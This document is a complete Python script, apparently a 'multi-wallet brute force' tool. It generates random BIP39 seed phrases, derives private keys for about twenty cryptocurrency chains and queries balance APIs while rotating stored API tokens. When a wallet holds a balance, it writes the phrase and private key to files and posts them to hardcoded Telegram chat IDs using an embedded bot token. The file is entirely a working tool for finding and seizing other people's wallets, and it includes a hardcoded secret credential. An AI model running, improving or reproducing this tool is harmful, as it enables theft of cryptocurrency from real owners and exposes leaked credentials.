import threading
import time

import bip_utils.bip.bip39
from bip_utils import Bip39SeedGenerator, Bip39MnemonicGenerator, Bip44, Bip44Coins, Bip44Changes
import colorama
from colorama import init
import random
import requests
import json
import os
import urllib.parse
from web3 import Web3

init()
seed_number = 1
max_number_of_threads = 50
words_list = []
is_aborted = False

not_valid_wallets = 0
valid_wallets = 0

wallets_with_balance = 0
wallets_with_empty_balance = 0

total_wallets_per_m = 0
total_valid_wallet_per_m = 0

wallet_per_m = threading.Thread()
logger_thread = threading.Thread()
valid_tokens_calc_thread = threading.Thread()

balance_checking_errors = 0
balance_checking_success = 0

working_threads = []
telegram_bot_token = "bot6702805791:AAGSwIpCbNGoNgb4-T5wSgHeoWWpPZyv-Hc"
telegram_chat_ids = ["7295990159","6152538122"]
total_valid_tokens = 0
brute_force_mode = 1
modes_limit = 2
tokens_dir = "./chainstack"

number_of_generated_working_threads = 0

coins_mapping_bip = [{"id": 1, 'coin_name': "arbitrum", "coin": Bip44Coins.ARBITRUM},
                     {"id": 2, 'coin_name': "avalanche", "coin": Bip44Coins.AVAX_C_CHAIN},
                     {"id": 3, 'coin_name': "binance-smart-chain", "coin": Bip44Coins.BINANCE_SMART_CHAIN},
                     {"id": 4, 'coin_name': "bitcoin", "coin": Bip44Coins.BITCOIN},
                     {"id": 5, 'coin_name': "bitcoin-cash", "coin": Bip44Coins.BITCOIN_CASH},
                     {"id": 6, 'coin_name': "dash", "coin": Bip44Coins.DASH},
                     {"id": 7, 'coin_name': "dogecoin", "coin": Bip44Coins.DOGECOIN},
                     {"id": 8, 'coin_name': "ethereum", "coin": Bip44Coins.ETHEREUM},
                     {"id": 9, 'coin_name': "ethereum-classic", "coin": Bip44Coins.ETHEREUM_CLASSIC},
                     {"id": 10, 'coin_name': "litecoin", "coin": Bip44Coins.LITECOIN},
                     {"id": 11, 'coin_name': "optimism", "coin": Bip44Coins.OPTIMISM},
                     {"id": 12, 'coin_name': "polygon", "coin": Bip44Coins.POLYGON},
                     {"id": 13, 'coin_name': "tezos", "coin": Bip44Coins.TEZOS},
                     {"id": 14, 'coin_name': "tron", "coin": Bip44Coins.TRON},
                     {"id": 15, 'coin_name': "xrp", "coin": Bip44Coins.RIPPLE},
                     {"id": 16, 'coin_name': "zcash", "coin": Bip44Coins.ZCASH},
                     {"id": 17, 'coin_name': "base", "coin": Bip44Coins.ETHEREUM},
                     {"id": 18, 'coin_name': "bnb", "coin": Bip44Coins.BINANCE_CHAIN},
                     {"id": 19, 'coin_name': "solona", "coin": Bip44Coins.SOLANA},
                     {"id": 20, 'coin_name': "aptos", "coin": Bip44Coins.APTOS},
                     ]

coins_to_check = []

coins_files_names = []

ascii_art = """

        ┳┳┓      ┓ ┏  ┓┓     ┳┓        ┏┓         
        ┃┃┃╋┏┓┏┓ ┃┃┃┏┓┃┃┏┓╋┏ ┣┫┏┓┓┏╋┏┓ ┣ ┏┓┏┓┏┏┓┏┓
        ┗┛┗┗┛ ┗┻━┗┻┛┗┻┗┗┗ ┗┛━┻┛┛ ┗┻┗┗ ━┻ ┗┛┛ ┗┗ ┛ 
                                          

"""

ascii_art_line = 6


def CheckBalanceCryptoapis(seed_bytes, coin, coin_name, token):
    global balance_checking_errors, balance_checking_success
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, coin)

    # Derive the account and change contexts
    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
    bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip44_addr = bip44_chg_ctx.AddressIndex(0)

    result = {
        "amount": 0,
        "unit": coin_name,
        "address": bip44_addr.PublicKey().ToAddress(),
        "private": bip44_addr.PrivateKey().Raw().ToHex(),
        "public": bip44_addr.PublicKey().ToExtended()
    }

    with open("Valid_Wallets_Private_keys.txt", 'a') as Valid_Wallets_Private_keys:
        Valid_Wallets_Private_keys.write(result["private"] + "\n")
        Valid_Wallets_Private_keys.close()

    try:
        res = requests.request("GET",
                               f"https://rest.cryptoapis.io/blockchain-data/{coin_name}/mainnet/addresses/{bip44_addr.PublicKey().ToAddress()}/balance"
                               , headers={"x-api-key": token})
        data = json.loads(res.text)

        balance = data["data"]["item"]["confirmedBalance"]

        result = {
            "amount": balance["amount"],
            "unit": balance["unit"],
            "address": bip44_chg_ctx.PublicKey().ToAddress(),
            "private": bip44_addr.PrivateKey().Raw().ToHex(),
            "public": bip44_addr.PublicKey().ToExtended()
        }
        balance_checking_success += 1

        return result

    except Exception as e:
        balance_checking_errors += 1
        return False


############# NONE WBE 3 ##################
def CheckWeb3ChainstackBalance(seed_bytes, coin, coin_name, token):
    global balance_checking_errors, balance_checking_success
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, coin)

    # Derive the account and change contexts
    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
    bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip44_addr = bip44_chg_ctx.AddressIndex(0)

    result = {
        "amount": 0,
        "unit": coin_name,
        "address": bip44_addr.PublicKey().ToAddress(),
        "private": bip44_addr.PrivateKey().Raw().ToHex(),
        "public": bip44_addr.PublicKey().ToExtended()
    }

    with open("Valid_Wallets_Private_keys.txt", 'a') as Valid_Wallets_Private_keys:
        Valid_Wallets_Private_keys.write(result["private"] + "\n")
        Valid_Wallets_Private_keys.close()

    try:

        web3 = Web3(Web3.HTTPProvider(token))

        address = Web3.to_checksum_address(result['address'])
        balance = web3.eth.get_balance(address, "latest")

        result = {
            "amount": balance,
            "unit": coin_name,
            "address": bip44_chg_ctx.PublicKey().ToAddress(),
            "private": bip44_addr.PrivateKey().Raw().ToHex(),
            "public": bip44_addr.PublicKey().ToExtended()
        }
        balance_checking_success += 1

        return result

    except Exception as e:
        balance_checking_errors += 1
        return False


def CheckSolonaChainstackBalance(seed_bytes, coin, coin_name, token):
    global balance_checking_errors, balance_checking_success
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, coin)

    # Derive the account and change contexts
    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
    bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip44_addr = bip44_chg_ctx.AddressIndex(0)

    result = {
        "amount": 0,
        "unit": coin_name,
        "address": bip44_addr.PublicKey().ToAddress(),
        "private": bip44_addr.PrivateKey().Raw().ToHex(),
        "public": bip44_addr.PublicKey().ToExtended()
    }

    with open("Valid_Wallets_Private_keys.txt", 'a') as Valid_Wallets_Private_keys:
        Valid_Wallets_Private_keys.write(result["private"] + "\n")
        Valid_Wallets_Private_keys.close()

    try:

        url = token
        payload = {
            "id": 1,
            "jsonrpc": "2.0",
            "method": "getBalance",
            "params": [result['address']]
        }
        headers = {
            "accept": "application/json",
            "content-type": "application/json"
        }

        response = requests.post(url, json=payload, headers=headers)
        balance = json.loads(response.text)['result']['value']

        result = {
            "amount": balance,
            "unit": coin_name,
            "address": bip44_chg_ctx.PublicKey().ToAddress(),
            "private": bip44_addr.PrivateKey().Raw().ToHex(),
            "public": bip44_addr.PublicKey().ToExtended()
        }
        balance_checking_success += 1

        return result

    except Exception as e:
        balance_checking_errors += 1
        return False


def CheckOptimismChainstackBalance(seed_bytes, coin, coin_name, token):
    global balance_checking_errors, balance_checking_success
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, coin)

    # Derive the account and change contexts
    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
    bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip44_addr = bip44_chg_ctx.AddressIndex(0)

    result = {
        "amount": 0,
        "unit": coin_name,
        "address": bip44_addr.PublicKey().ToAddress(),
        "private": bip44_addr.PrivateKey().Raw().ToHex(),
        "public": bip44_addr.PublicKey().ToExtended()
    }

    with open("Valid_Wallets_Private_keys.txt", 'a') as Valid_Wallets_Private_keys:
        Valid_Wallets_Private_keys.write(result["private"] + "\n")
        Valid_Wallets_Private_keys.close()

    try:

        url = token

        payload = {
            "jsonrpc": "2.0",
            "method": "eth_getBalance",
            "id": 1,
            "params": [result["address"], "latest"]
        }
        headers = {
            "accept": "application/json",
            "content-type": "application/json"
        }

        response = requests.post(url, json=payload, headers=headers)
        balance = json.loads(response.text)["result"]

        result = {
            "amount": float(str(balance).replace("x",".")),
            "unit": coin_name,
            "address": bip44_chg_ctx.PublicKey().ToAddress(),
            "private": bip44_addr.PrivateKey().Raw().ToHex(),
            "public": bip44_addr.PublicKey().ToExtended()
        }
        balance_checking_success += 1

        return result

    except Exception as e:
        balance_checking_errors += 1
        return False


def CheckBaseChainstackBalance(seed_bytes, coin, coin_name, token):
    global balance_checking_errors, balance_checking_success
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, coin)

    # Derive the account and change contexts
    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
    bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip44_addr = bip44_chg_ctx.AddressIndex(0)

    result = {
        "amount": 0,
        "unit": coin_name,
        "address": bip44_addr.PublicKey().ToAddress(),
        "private": bip44_addr.PrivateKey().Raw().ToHex(),
        "public": bip44_addr.PublicKey().ToExtended()
    }

    with open("Valid_Wallets_Private_keys.txt", 'a') as Valid_Wallets_Private_keys:
        Valid_Wallets_Private_keys.write(result["private"] + "\n")
        Valid_Wallets_Private_keys.close()

    try:
        url = token

        payload = {
            "jsonrpc": "2.0",
            "method": "eth_getBalance",
            "id": 1,
            "params": [result["address"], "latest"]
        }
        headers = {
            "accept": "application/json",
            "content-type": "application/json"
        }

        response = requests.post(url, json=payload, headers=headers)
        balance = json.loads(response.text)["result"]

        result = {
            "amount": float(str(balance).replace("x",".")),
            "unit": coin_name,
            "address": bip44_chg_ctx.PublicKey().ToAddress(),
            "private": bip44_addr.PrivateKey().Raw().ToHex(),
            "public": bip44_addr.PublicKey().ToExtended()
        }
        balance_checking_success += 1

        return result

    except Exception as e:
        balance_checking_errors += 1
        return False


############# NONE WBE 3 ##################


def walletGenerator(token_start_index):
    global is_aborted, words_list, not_valid_wallets, valid_wallets
    global wallets_with_balance, wallets_with_empty_balance
    global telegram_bot_token, telegram_chat_ids, coins_to_check, brute_force_mode

    token_start_index = token_start_index % len(coins_to_check)

    while not is_aborted:

        phrase = ''
        generated_words = 0
        while generated_words < 12:
            phrase_word_index = random.randint(0, 2047)

            if phrase.count(words_list[phrase_word_index]) != 12:
                generated_words += 1
            else:
                continue

            if generated_words != 1:
                phrase += " " + words_list[phrase_word_index]
            else:
                phrase += words_list[phrase_word_index]

        try:
            # Generate the seed bytes from the mnemonic phrase
            seed_bytes = Bip39SeedGenerator(phrase).Generate("")

            valid_wallets += 1

            with open("Valid_Wallets.txt", 'a') as Valid_Wallets:
                Valid_Wallets.write(phrase + "\n")
                Valid_Wallets.close()

            token_index_counter = token_start_index
            checked_tokens = 0

            while checked_tokens < len(coins_to_check):
                balance = False

                if brute_force_mode == 1:
                    balance = CheckBalanceCryptoapis(seed_bytes, coins_to_check[token_index_counter]['coin'],
                                                     coins_to_check[token_index_counter]['coin_name'],
                                                     coins_to_check[token_index_counter]['token'])

                elif brute_force_mode == 2:
                    if coins_to_check[token_index_counter]['coin_name'] == "solona":
                        balance = CheckSolonaChainstackBalance(seed_bytes, coins_to_check[token_index_counter]['coin'],
                                                               coins_to_check[token_index_counter]['coin_name'],
                                                               coins_to_check[token_index_counter]['token'])

                    elif coins_to_check[token_index_counter]['coin_name'] == "optimism":
                        balance = CheckOptimismChainstackBalance(seed_bytes,
                                                                 coins_to_check[token_index_counter]['coin'],
                                                                 coins_to_check[token_index_counter]['coin_name'],
                                                                 coins_to_check[token_index_counter]['token'])

                    elif coins_to_check[token_index_counter]['coin_name'] == "base":
                        balance = CheckBaseChainstackBalance(seed_bytes, coins_to_check[token_index_counter]['coin'],
                                                             coins_to_check[token_index_counter]['coin_name'],
                                                             coins_to_check[token_index_counter]['token'])
                    else:
                        balance = CheckWeb3ChainstackBalance(seed_bytes, coins_to_check[token_index_counter]['coin'],
                                                             coins_to_check[token_index_counter]['coin_name'],
                                                             coins_to_check[token_index_counter]['token'])

                loadToken([coins_to_check[token_index_counter]["coin_name"]])

                if isinstance(balance, dict):

                    coins_to_check[token_index_counter]["usage"] += 1

                    if balance['amount'] > 0:

                        wallets_with_balance += 1

                        with open("./result.txt", 'a') as results_files:

                            results_files.write(f"Phrase : {phrase}\n")

                            results_files.write(f"Address : {balance['address']}\n")

                            results_files.write(f"Public-Key : {balance['address']}\n")

                            results_files.write(f"Private-Key : {balance['private']}\n")

                            results_files.write(f"Balance : {balance['amount']}\n")

                            results_files.write(f"Coin : {balance['unit']}\n")

                            wallet = {"Phrase": phrase, "Address": balance['address'], "Balance": balance['amount'],
                                      "Coin": balance['unit'], "Private-Key": balance['private'],
                                      "Public-Key": balance['public']}
                            wallet_formated = "\n".join([f"<b>{key}</b>: {value}" for key, value in wallet.items()])

                            try:
                                for user in telegram_chat_ids:
                                    message = {'chat_id': user, 'text': wallet_formated, 'parse_mode': 'HTML'}
                                    # encoded_data = urllib.parse.urlencode(message)
                                    requests.request("POST",
                                                     f'https://api.telegram.org/{telegram_bot_token}/sendMessage',
                                                     data=message)
                            except Exception as e:
                                print(f"{colorama.Fore.RED}Error sending result to telegram")
                    else:
                        wallets_with_empty_balance += 1

                checked_tokens += 1

                if token_index_counter < len(coins_to_check):
                    token_index_counter += 1
                else:
                    token_index_counter = 0


        except Exception as e:
            not_valid_wallets += 1
            continue


def loadToken(coins):
    global coins_to_check, brute_force_mode, tokens_dir
    for coin in coins:
        try:

            file_path = f"{tokens_dir}/{coin}.txt"
            all_tokens = []

            with open(file_path, 'r') as all_tokens_file:
                all_tokens = all_tokens_file.readlines()

            valid_tokens = []

            for token in all_tokens:
                if token.strip().split(" ")[0] != "":
                    if int(token.strip().split(" ")[1]) < int(token.strip().split(" ")[2]):
                        valid_tokens.append(token.strip() + "\n")

            if len(valid_tokens) != 0:

                random.shuffle(valid_tokens)

                index = -1

                for i, coin_dic in enumerate(coins_to_check):
                    if coin_dic['coin_name'] == coin:
                        index = i
                        break

                if index != -1:
                    if len(coins_to_check[index]['token']) != 0:
                        for i, valid_token in enumerate(valid_tokens):
                            if coins_to_check[index]['token'] in valid_token:
                                valid_tokens[i] = f"{valid_tokens[i].strip().split(" ")[0]} {str(coins_to_check[index]['usage'])} {str(coins_to_check[index]['max_usage'])}\n"
                                break

                    coins_to_check[index]['token'] = valid_tokens[0].strip().split(" ")[0]
                    coins_to_check[index]['usage'] = int(valid_tokens[0].strip().split(" ")[1])
                    coins_to_check[index]['max_usage'] = int(valid_tokens[0].strip().split(" ")[2])

                with open(file_path, 'w') as coin_tokens:
                    coin_tokens.writelines(valid_tokens)


        except Exception as e:
            print(e)
            print(f"{colorama.Fore.RED} Error loading {coin} {tokens_dir.replace("./","")}")


def walletPerM():
    global is_aborted, valid_wallets, total_wallets_per_m, total_valid_wallet_per_m, not_valid_wallets

    while not is_aborted:
        current_total_generated_wallets = (not_valid_wallets + valid_wallets)
        current_total_valid_generated_wallets = valid_wallets
        time.sleep(60)
        total_wallets_per_m = (not_valid_wallets + valid_wallets) - current_total_generated_wallets
        total_valid_wallet_per_m = valid_wallets - current_total_valid_generated_wallets


def loggerThread():
    global valid_wallets, not_valid_wallets, max_number_of_threads, seed_number, is_aborted
    global wallets_with_balance, wallets_with_empty_balance, total_wallets_per_m, total_valid_wallet_per_m
    global ascii_art_line, working_threads, balance_checking_errors, balance_checking_success
    global total_valid_tokens

    os.system('cls')
    # os.system('clear')

    while not is_aborted:
        print(f"{colorama.Fore.GREEN}{ascii_art}")
        print(f"{colorama.Fore.GREEN}       Total Generated Valid Wallets : {colorama.Fore.BLUE}{valid_wallets}")
        print(
            f"{colorama.Fore.GREEN}       Total Generated None Valid Wallets : {colorama.Fore.RED}{not_valid_wallets}")
        print(
            f"{colorama.Fore.GREEN}       Total Generated  Wallets : {colorama.Fore.BLUE}{str(not_valid_wallets + valid_wallets)}")
        print(
            f"{colorama.Fore.GREEN}       Total Generated Valid Wallets With Balance : {colorama.Fore.BLUE}{wallets_with_balance}")
        print(
            f"{colorama.Fore.GREEN}       Total Generated Valid Wallets With No Balance : {colorama.Fore.RED}{wallets_with_empty_balance}")
        print(f"{colorama.Fore.GREEN}       Number Of Thread : {colorama.Fore.BLUE}{max_number_of_threads}")
        print(
            f"{colorama.Fore.GREEN}       Total Valid Wallets Per Minute : {colorama.Fore.BLUE}{total_valid_wallet_per_m}")
        print(f"{colorama.Fore.GREEN}       Total Wallets Per Minute : {colorama.Fore.BLUE}{total_wallets_per_m}")
        print(f"{colorama.Fore.GREEN}       Current Used Seed : {colorama.Fore.BLUE}{seed_number}")
        print(f"{colorama.Fore.GREEN}       Current Working Threads : {colorama.Fore.BLUE}{len(working_threads)}")
        print(
            f"{colorama.Fore.GREEN}       Total Balance Checking Attempts : {colorama.Fore.BLUE}{str(balance_checking_errors + balance_checking_success)}")
        print(
            f"{colorama.Fore.GREEN}       Total Balance Checking Attempts With Errors : {colorama.Fore.RED}{balance_checking_errors}")
        print(
            f"{colorama.Fore.GREEN}       Total Balance Checking Attempts With Success : {colorama.Fore.BLUE}{balance_checking_success}")

        move_up = "\033[F" * 19  # Moves the cursor up 19 lines
        clear_line = "\033[K"  # Clears the line from cursor position to the end

        print(move_up, end='\r')

        # Clear each line to prevent overlapping
        for _ in range(19):
            print(clear_line + move_up, end='\r')
    else:
        os.system('cls')


# def validTokensCalc():
#     global total_valid_tokens, is_aborted, coins_to_check
#
#     while not is_aborted:
#         for i, coin in enumerate(coins_to_check):
#             try:
#                 file_path = f"./cryptoapis/{coin['coin_name']}.txt"
#                 all_tokens = []
#
#                 with open(file_path, 'r') as all_tokens_file:
#                     all_tokens = all_tokens_file.readlines()
#                     all_tokens_file.close()
#
#                 index = -1
#                 for i_t, coin_token in enumerate(total_valid_tokens):
#                     if coin_token['coin_name'] == coin['coin_name']:
#                         index = i_t
#                         break
#
#                 token_coin = {'coin_name':coin['coin_name'],'cryptoapis':len(all_tokens)}
#                 if index != -1:
#                     total_valid_tokens[index] = token_coin
#
#             except Exception as e:
#                 print(e)
#                 # print(f"{colorama.Fore.RED} Error loading cryptoapis")
#

def validTokensCalc():
    global total_valid_tokens, is_aborted, tokens_dir

    while not is_aborted:

        total_valid_tokens = 0

        try:
            for coin_tokens_file_path in os.listdir(tokens_dir):

                if coin_tokens_file_path.split(".")[1] == "txt":

                    with open(os.path.join(tokens_dir, coin_tokens_file_path), 'r') as coin_tokens_file:

                        for token in coin_tokens_file.readlines():
                            if token.strip().split(" ")[0] != "":
                                if int(token.strip().split(" ")[1]) < int(token.strip().split(" ")[2]):
                                    total_valid_tokens += 1

                        coin_tokens_file.close()
        except Exception as e:
            # print(e)
            print(f"{colorama.Fore.RED} Error loading  {tokens_dir.replace("./", "")}")


def Main_Thread():
    global seed_number, max_number_of_threads, words_list, coins_files_names, working_threads
    global wallet_per_m, logger_thread, valid_tokens_calc_thread, valid_wallets, not_valid_wallets
    global brute_force_mode, modes_limit, tokens_dir, coins_mapping_bip

    print(f"{colorama.Fore.GREEN}{ascii_art}")
    print(f"{colorama.Fore.GREEN}> Enter (Ctrl + C) any time to exist")
    print(f"{colorama.Fore.GREEN}> Enter seed number")

    try:
        seed_number = int(input(f"{colorama.Fore.GREEN}> {colorama.Fore.BLUE}")) % 10000000000
    except:
        print(f"{colorama.Fore.RED} Error, enter a number")
        exit()

    print(f"{colorama.Fore.GREEN}> Enter max number of threads")

    try:
        max_number_of_threads = int(input(f"{colorama.Fore.GREEN}> {colorama.Fore.BLUE}"))
    except:
        print(f"{colorama.Fore.RED} Error, enter a number")
        exit()

    print(f"{colorama.Fore.GREEN}> Enter brute force mode")
    print(f"{colorama.Fore.GREEN}> 1- cryptoapis.com APIS")
    print(f"{colorama.Fore.GREEN}> 2- chainstack APIS")


    try:
        brute_force_mode = int(input(f"{colorama.Fore.GREEN}> {colorama.Fore.BLUE}"))
        if brute_force_mode < 0 or brute_force_mode > modes_limit:
            print(f"{colorama.Fore.RED} Error, enter a valid mode")
            exit()
    except:
        print(f"{colorama.Fore.RED} Error, enter a number")
        exit()

    if brute_force_mode == 1:
        tokens_dir = "./cryptoapis"

    elif brute_force_mode == 2:
        tokens_dir = "./chainstack"

    print(f"{colorama.Fore.GREEN}> Please wait loading {tokens_dir.replace("./", "")} tokens, and words")


    for tokens_file_path in os.listdir(tokens_dir):

        if tokens_file_path.split(".")[1] == "txt":

            for i, coin_bip in enumerate(coins_mapping_bip):
                if coin_bip['coin_name'] == tokens_file_path.split(".")[0]:
                    initializer_coin = {'token': '', 'max_usage': 0, 'usage': 0}
                    coin_bip.update(initializer_coin)
                    coins_to_check.append(coin_bip)
                    coins_files_names.append(coin_bip['coin_name'])

    with open("./WordsList.txt", 'r') as wordsList:

        for word in wordsList.readlines():
            words_list.append(word.replace("\n", ""))

        wordsList.close()

    loadToken(coins_files_names)

    valid_tokens_calc_thread = (threading.Thread(target=validTokensCalc))

    valid_tokens_calc_thread.start()

    random.seed(seed_number)

    wallet_per_m = threading.Thread(target=walletPerM)
    wallet_per_m.start()
    logger_thread = threading.Thread(target=loggerThread)
    logger_thread.start()

    for i in range(max_number_of_threads):
        time.sleep(1)
        wallet_gen_thread = threading.Thread(target=walletGenerator, args=(i,))
        working_threads.append(wallet_gen_thread)
        wallet_gen_thread.start()

    while not is_aborted:
        time.sleep(1000)
        if (valid_wallets + not_valid_wallets) >= 10000000:
            seed_number += 1
            seed_number = seed_number % 10000000000
            random.seed(seed_number)


try:
    Main_Thread()

except KeyboardInterrupt:
    print(f"{colorama.Fore.RED}\nProgram interrupted by the user (Ctrl+C).")
    is_aborted = True

except SystemExit:
    print(f"{colorama.Fore.RED}\nProgram is exiting...")
    is_aborted = True


finally:
    print(
        f"{colorama.Fore.RED}CLEANING MEMORY PLEASE DON'T KILL THIS APP FROM TASK MANAGER\nTO SAVE YOUR MEMORY FROM DYING :))")

    for th in working_threads:
        th.join()

    wallet_per_m.join()
    logger_thread.join()
    valid_tokens_calc_thread.join()
